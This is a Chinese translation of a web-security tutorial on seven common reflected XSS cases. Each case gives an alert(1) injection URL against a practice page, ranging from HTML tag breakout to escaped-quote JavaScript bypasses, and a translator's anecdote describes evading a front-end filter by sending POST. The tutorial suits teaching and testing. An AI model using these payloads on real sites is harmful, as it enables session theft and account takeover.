> 原文链接: https://www.anquanke.com//post/id/86585 


# 【技术分享】每个人都该知道的7种主要的XSS案例


                                阅读量   
                                **171077**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/](https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01df16eaa5c0266560.png)](https://p5.ssl.qhimg.com/t01df16eaa5c0266560.png)



译者：[DropsAm4zing](http://bobao.360.cn/member/contribute?uid=2914824807)

预估稿费：160RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**0x00 引子**

****

**“Master the 7 Main XSS Cases and be able to spot more than 90% of XSS vulnerabilities out there.”**

这句话说的这么diao，吓得我赶紧早早起来好好学学姿势。

当我们读一些XSS相关资料时，经常能看到像&lt;script&gt;alert(1)&lt;/script&gt;这样经典的PoC(Proof of Concept)代码。尽管简单明了，但它并不能够让这个领域的初学者在真枪实战中有进一步的提升。

So，本文中介绍的7个实例，目的是让大家在学习之后便能对绝大多数的XSS漏洞不仅仅是证明其存在，而是利用它们。

练习站点链接：[https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php)

[![](https://p3.ssl.qhimg.com/t017303348e999a8d95.png)](https://p3.ssl.qhimg.com/t017303348e999a8d95.png)

在源码开头的HTML注释中包含了触发每个案例的所有参数，这些参数都可通过GET和POST提交请求。

 [![](https://p3.ssl.qhimg.com/t01e9d25ea012ecf787.png)](https://p3.ssl.qhimg.com/t01e9d25ea012ecf787.png)

可能你注意到了，所有的案例都是基于源的，这意味着注入会始终显示在HTTP响应正文的源代码检索中。反射型或存储型相互独立，但这里重要的是它们触发时上下文关系的呈现，因此我们以反射型为主。基于DOM类型的XSS 漏洞不暴露在源代码，我们暂不赘述。

一定要记得在本机没有XSS过滤器的浏览器中尝试下面这些实例，如Mozilla Firefox。

<br>

**0x01 URL 反射**

****

当源代码中存在URL反射时，我们可以添加自己的XSS向量和载荷。对于PHP的页面，可以通过使用斜杠”/”在页面的名称后添加任何内容。

```
http://brutelogic.com.br/xss.php/”&gt;&lt;svg onload=alert(1)&gt;
```



需要用开头的(“&gt;)标签来破坏当前标签的闭合状态，为将插入的新标签(触发XSS的代码标签)创造可能的闭合条件。



```
&lt;!—URL Reflection --&gt;
&lt;form action=”/xss.php/”&gt;&lt;svg onload=alert(1)&gt;” method=”POST”&gt;
&lt;br&gt;
```

[![](https://p3.ssl.qhimg.com/t01ce9dfd4e8963c09c.png)](https://p3.ssl.qhimg.com/t01ce9dfd4e8963c09c.png)

虽然不同语言的差异造成的不同的触发原因(反射可能出现在路径或URL参数中)。相对于PHP而言，罪魁祸首通常是在提交表单的动作中使用到了全局变量。

```
$_SERVER[“PHP_SELF”]
```



**0x02 简单的HTMLi(HTML注入)**

****

最直接的一种方式，输入就是反射，输入部分显示在已存在的标签之前、后或标签之间。不需要绕过或破坏任何闭合，任何简单的像&lt;tag handler=jsCode&gt;形式的XSS向量都可以实现。

```
http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;
```





```
&lt;h1&gt;XSS Test&lt;/h1&gt;
&lt;!-- Simple HTMLi --&gt;
Hello, &lt;svg onload=alert(1)&gt;!
&lt;br&gt;
```



**[![](https://p5.ssl.qhimg.com/t01016b2f728009d6d9.png)](https://p5.ssl.qhimg.com/t01016b2f728009d6d9.png)**

**<br>**

**0x03 Inline HTMLi**

****

和上一个相比这个实例也相对简单，但是需要 "&gt; 破坏前面的闭合标签，重新添加并创建新的标签闭合。



```
&lt;!-- Inline HTMLi (Double Quotes) --&gt;
&lt;input type="text" name="b1" value=""&gt;&lt;svg onload=alert(1)&gt;"&gt;
&lt;br&gt;
&lt;br&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0181334e046f5b9a02.png)<br>

<br>

**0x04 Inline HTMLi: No Tag Breaking**

****

当在HTML属性中输入并且对大于号(&gt;)进行过滤时，像之前的实例一样破坏前面的闭合标签达到反射是不可能了。



```
&lt;!-- Inline HTMLi - No Tag Breaking (Double Quotes) --&gt;
&lt;input type="text" name="b3" value=""&amp;gt;&gt;&lt;svg onload=alert(1)&amp;gt;"&gt;
&lt;br&gt;
&lt;br&gt;
```

[![](https://p1.ssl.qhimg.com/t01fe73b42927496ddb.png)](https://p1.ssl.qhimg.com/t01fe73b42927496ddb.png)

所以这里使用一个适合我们在此处注入的，并可在标签内触发的事件处理程序，比如:

```
http://brutelogic.com.br/xss.php?b3=” onmouseover=alert(1)//
```

这个方式闭合了标签中value值的引号，并且给onmouseover插入了事件。alert(1)之后的双引号通过双斜杠注释掉，当受害者的鼠标移动到输入框时触发js弹窗。



**0x05 HTMLi in Js(Javascript) Block**

****

输入有时候会传入到javascript代码块中，这些输入通常是代码中的一些变量的值。但因为HTML标签在浏览器的解析中有优先级，所以我们可以通过js标签闭合原有的js代码块并插入一个新的标签插入传入你需要的js代码。

```
http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;
```



```
// HTMLi in Js Block (Single Quotes)
var myVar1 = '&lt;/script&gt;&lt;svg onload=alert(1)&gt;';
```

 [![](https://p4.ssl.qhimg.com/t01091d199065d2cc75.png)](https://p4.ssl.qhimg.com/t01091d199065d2cc75.png)



**0x06 Simple Js Injection**

****

如果脚本的标签被某种方式过滤掉了，之前讨论的姿势也随之失效。



```
// Simple Js Injection (Single Quotes)
var myVar3 = '&gt;&lt;svg onload=alert(1)&gt;';
```

这里的绕过方法可以根据语法注入javascript代码。一个已知的方法是用我们想要执行的代码”连接”到可触发漏洞的变量。因为我们不能让任何单引号引起报错，所以先构造闭合，然后使用”-”连接来获得一个有效的javascript代码。



```
http://brutelogic.com.br/xss.php?c3=’-alert(1)-‘
// Simple Js Injection (Single Quotes)
var myVar3 = ''-alert(1)-'';
```

[![](https://p2.ssl.qhimg.com/t0178346a86739042d7.png)](https://p2.ssl.qhimg.com/t0178346a86739042d7.png)



**0x07 Escaped Js Injection**

****

在之前的实例中，如果引号(用于置空闭合变量的值)被反斜杠()转义，注入将不会生效(因为无效的语法)。



```
// Escaped Js Injection (Single Quotes)
var myVar5 = ''-alert(1)-'';
```

为此，我们可以通过骚姿势——转义。我们可以插入一个前反斜杠，这样后面的引号将会完成闭合，从而触发传入的js代码。在插入我们想要执行的js代码后，需要对其余部分进行注释，因为剩余的部分已经无需执行或重复执行。



```
http://brutelogic.com.br/xss.php?c5='-alert(1)//
// Escaped Js Injection (Single Quotes)
var myVar5 = '\'-alert(1)-//';
```

[![](https://p5.ssl.qhimg.com/t012e6d5a52e12054b0.png)](https://p5.ssl.qhimg.com/t012e6d5a52e12054b0.png)

**<br>**

**扩展一点点?**

****

这里自己扩展一个自己的实际应用中遇到然后学到的姿势，希望看完能有所收获。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ad835bd1b5684bd3.png)

[![](https://p4.ssl.qhimg.com/t012646e28b4ddf3ba6.png)](https://p4.ssl.qhimg.com/t012646e28b4ddf3ba6.png)

直接通过URL通过GET请求触发XSS返回404，通过参数直接访问可以显示正常界面，那么应该是被过滤了。先自己用xsstrike跑了一下，提示是存在XSS的，但是打开浏览器的反应都是返回了空白页面，说明是多次的误报(xsstrike不是基于webkit，因此容易产生误报)。

而后查看源码，在页面可以看到前端通过正则过滤了特殊字符，重定向到404页面。

[![](https://p2.ssl.qhimg.com/t015b59c9dabfb175a3.png)](https://p2.ssl.qhimg.com/t015b59c9dabfb175a3.png)

[![](https://p0.ssl.qhimg.com/t0121366524af51b753.png)](https://p0.ssl.qhimg.com/t0121366524af51b753.png)

过滤的很全乎，那看起来好像是没戏了，遂去请教大神，所以姿势就涨起来了。

这里的原因是因为后端PHP在处理请求的时候使用的是$_REQUEST方法，因此可接受POST和GET请求。

So，成功弹窗。

[![](https://p2.ssl.qhimg.com/t014f56878584ed85fd.png)](https://p2.ssl.qhimg.com/t014f56878584ed85fd.png)
